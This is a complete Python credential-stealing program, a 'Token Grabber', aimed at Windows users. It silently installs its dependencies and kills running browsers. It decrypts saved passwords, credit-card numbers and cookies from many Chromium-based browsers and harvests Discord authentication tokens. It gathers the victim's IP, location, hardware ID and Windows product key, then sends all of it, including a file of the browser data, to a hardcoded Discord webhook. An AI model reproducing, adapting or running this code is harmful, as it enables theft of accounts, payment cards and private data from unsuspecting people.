try:
    from base64 import b64decode
    from Crypto.Cipher import AES
    from win32crypt import CryptUnprotectData
    from contextlib import redirect_stdout, redirect_stderr, contextmanager
    import tempfile
    import time
    from os import getlogin, listdir
    from json import loads
    from re import findall
    from urllib.request import Request, urlopen
    from subprocess import Popen, PIPE, run
    import requests
    import platform as pf
    import os
    import base64
    import json
    import shutil
    import sqlite3
    from datetime import datetime, timedelta
    import subprocess
except:
    import subprocess
    import sys

    required_modules = [
        "pycryptodome",
        "pypiwin32",
        "requests",
        "Crypto",
        "win32crypt"
    ]

    def install(module):
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", module])

    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            install(module)

@contextmanager
def suppress_output():
    with open(os.devnull, 'w') as fnull:
        with redirect_stdout(fnull), redirect_stderr(fnull):
            yield

def prodKey():
    return run(['wmic', 'path', 'SoftwareLicensingService', 'get', 'OA3xOriginalProductKey'], capture_output=True, text=True).stdout

cleaned_output = [line.strip() for line in prodKey().splitlines() if line.strip() and not line.startswith('OA3xOriginalProductKey')]
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
product_key = cleaned_output[0] if cleaned_output else None
censored = True
tokens = []
cleaned = []
checker = []

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

browsers = {
    'avast': local + '\\AVAST Software\\Browser\\User Data',
    'amigo': local + '\\Amigo\\User Data',
    'torch': local + '\\Torch\\User Data',
    'kometa': local + '\\Kometa\\User Data',
    'orbitum': local + '\\Orbitum\\User Data',
    'cent-browser': local + '\\CentBrowser\\User Data',
    '7star': local + '\\7Star\\7Star\\User Data',
    'sputnik': local + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': local + '\\Vivaldi\\User Data',
    'chromium': local + '\\Chromium\\User Data',
    'chrome-canary': local + '\\Google\\Chrome SxS\\User Data',
    'chrome': local + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': local + '\\Epic Privacy Browser\\User Data',
    'msedge': local + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': local + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': local + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': local + '\\Microsoft\\Edge Dev\\User Data',
    'uran': local + '\\uCozMedia\\Uran\\User Data',
    'yandex': local + '\\Yandex\\YandexBrowser\\User Data',
    'brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': local + '\\Iridium\\User Data',
    'coccoc': local + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}
browsers_to_kill = [
    'chrome.exe',
    'firefox.exe',
    'msedge.exe',
    'brave.exe',
    'opera.exe',
    'vivaldi.exe',
    'yandex.exe',
    'avast.exe',
    'amigo.exe',
    'torch.exe',
    'kometa.exe',
    'orbitum.exe',
    'centbrowser.exe',
    '7star.exe',
    'sputnik.exe',
    'epic.exe',
    'iridium.exe',
    'coccoc.exe',
    'opera_gx.exe'
]

def kill_browsers():
    for browser in browsers_to_kill:
        try:
            subprocess.run(f'taskkill /F /IM {browser}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
    

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + '\\Local State', 'r', encoding='utf-8').read():
        return

    with open(path + '\\Local State', 'r', encoding='utf-8') as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x] + '\\Local State'):
            available.append(x)
    return available

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def write_browser_info_to_temp(info):
    with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
        temp_file.write(info)
    return temp_file.name

def save_results(browser_name, type_of_data, content, temp_dir):
    if not os.path.exists(temp_dir):
        os.mkdir(temp_dir)
    if content != '' and content is not None:
        open(os.path.join(temp_dir, f'{browser_name}_{type_of_data}.txt'), 'w', encoding='utf-8').write(content)

def get_data(path: str, profile: str, key, type_of_data, temp_dir):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return ''
    
    result = ''
    temp_db = os.path.join(temp_dir, 'temp_db')  # Create temp_db in the temp_dir
    
    try:
        shutil.copy(db_file, temp_db)
    except Exception as e:
        return result

    conn = None
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute(type_of_data['query'])
        
        for row in cursor.fetchall():
            row = list(row)
            if type_of_data['decrypt']:
                for i in range(len(row)):
                    if isinstance(row[i], bytes) and row[i]:
                        try:
                            row[i] = decrypt_password(row[i], key)
                        except Exception as e:
                            row[i] = 'Error decrypting'
            if type_of_data['query'] == 'history':
                if row[2] != 0:
                    row[2] = convert_chrome_time(row[2])
                else:
                    row[2] = '0'
            try:
                result += '\n'.join([f'{col}: {val}' for col, val in zip(type_of_data['columns'], row)]) + '\n\n'
            except Exception as e:
                pass
    except sqlite3.OperationalError as e:
        pass
    finally:
        if conn:
            conn.close()
        time.sleep(1)
        try:
            os.remove(temp_db)  # Delete temp_db after use
        except Exception:
            pass

    return result

def stealBrowserData():
    # Create a temporary directory
    with tempfile.TemporaryDirectory() as temp_dir:
        available_browsers = installed_browsers()
        all_browser_info = ''

        for browser in available_browsers:
            browser_path = browsers[browser]
            master_key = get_master_key(browser_path)

            for data_type_name, data_type in data_queries.items():
                profile = 'Default' if browser not in ['opera-gx'] else ''
                data = get_data(browser_path, profile, master_key, data_type, temp_dir)
                save_results(browser, data_type_name, data, temp_dir)

                if data:
                    all_browser_info += f'Browser: {browser}\nData Type: {data_type_name}\n{data}\n\n'

        return write_browser_info_to_temp(all_browser_info)

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return 'Error'

def getip():
    ip = 'None'
    try:
        ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
    except: 
        pass
    return ip

def gethwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1].strip()

def get_geo(ip):
    geo = {}
    try:
        geo = requests.get(f'http://ip-api.com/json/{ip}').json()
    except:
        pass
    return geo

def censor_string(s, count):
    length = len(s)
    if length <= 2:
        return s
    if count >= length:
        return 'X' * length
    half_count = count // 2
    start = (length // 2) - half_count
    return s[:start] + 'X' * count + s[start + count:]

def get_token():
    already_check = []
    checker = []
    chrome = local + '\\Google\\Chrome\\User Data'
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): 
            continue
        try:
            with open(path + f'\\Local State', 'r') as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
        except: 
            continue

        for file in listdir(path + f'\\Local Storage\\leveldb\\'):
            if not (file.endswith('.ldb') or file.endswith('.log')): 
                continue
            try:
                with open(path + f'\\Local Storage\\leveldb\\{file}', 'r', errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            tokens.append(values)
            except PermissionError: 
                continue
        
        for i in tokens:
            if i.endswith('\\'):
                i.replace('\\', '')
            elif i not in cleaned:
                cleaned.append(i)
                
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError:
                continue

            if tok not in already_check:
                already_check.append(tok)
                headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

                if res.status_code == 200:
                    res_json = res.json()
                    user_name = f'{res_json['username']}#{res_json['discriminator']}'
                    user_id = res_json['id']
                    email = res_json['email']
                    phone = res_json['phone']
                    mfa_enabled = res_json['mfa_enabled']
                    has_nitro = False
                    nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()
                    has_nitro = bool(len(nitro_data) > 0)

                    if has_nitro:
                        days_left = (datetime.strptime(nitro_data[0]['current_period_end'].split('.')[0], '%Y-%m-%dT%H:%M:%S') - 
                                     datetime.strptime(nitro_data[0]['current_period_start'].split('.')[0], '%Y-%m-%dT%H:%M:%S')).days
                    else:
                        days_left = 0

    ip = getip()
    geo_info = get_geo(ip)
    user = getlogin()
    country = geo_info['country']
    region = geo_info['regionName']
    city = geo_info['city']
    zip = geo_info['zip']
    oss = f'{pf.system()} {pf.release()}'
    osVer = pf.version()

    data = {
        'ip': censor_string(ip, 9),
        'country': censor_string(country, 6) if censored else country,
        'region': censor_string(region, 6) if censored else region,
        'city': censor_string(city, 6) if censored else city,
        'zip': censor_string(zip, 2) if censored else zip,
        'hardwareid': censor_string(gethwid(), 24) if censored else gethwid(),
        'email': censor_string(email, 8) if censored else email,
        'pkey': censor_string(product_key, 14) if censored else product_key,
        'phone': phone,
        '2fa': mfa_enabled,
        'nitro': has_nitro,
        'nitroLeft': days_left,
        'token': tok
    }

    content = f'> Another day, another steal:\n> \n' \
              f'> Network / geo informations:\n' \
              f'> IP: {data['ip']}\n' \
              f'> Country: {data['country']}\n' \
              f'> Region: {data['region']}\n' \
              f'> City: {data['city']}\n' \
              f'> ZIP Code: {data['zip']}\n' \
              f'> PC User: {user}\n> \n' \
              f'> Discord Infos:\n' \
              f'> Username: {user_name}\n' \
              f'> User ID: {user_id}\n' \
              f'> Email: {data['email']}\n' \
              f'> Phone: {data['phone']}\n' \
              f'> Two Factor Auth: {data['2fa']}\n' \
              f'> Nitro: {data['nitro']}\n' \
              f'> Nitro Left: {data['nitroLeft']} day(s)\n' \
              f'> Token:|| {data['token']} ||\n' \
              f'> Windows Informations:\n' \
              f'> OS: {oss}\n' \
              f'> Version: {osVer}\n' \
              f'> Hwid: {data['hardwareid']}\n' \
              f'> Product Key: {data['pkey']}\n' \

    kill_browsers()
    browserData = stealBrowserData()

    webhook_url = 'https://discord.com/api/webhooks/1307488127312465922/09xFENNCrOCaGHFQ1Dqf3qUT5uxetiBFM6L74_4yL8__s-hHiumZr5g94PCHXjrNUlmj'
    payload = {
        'content': content,
        'username': 'Token Grabber',
        'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'
    }
    with open(browserData, 'rb') as f:
        file_name = os.path.basename(browserData)
        response = requests.post(webhook_url, json=payload)
        response = requests.post(webhook_url, files={'file': (browserData, f)})
    os.remove(browserData)

if __name__ == '__main__':
    with suppress_output():
        get_token()
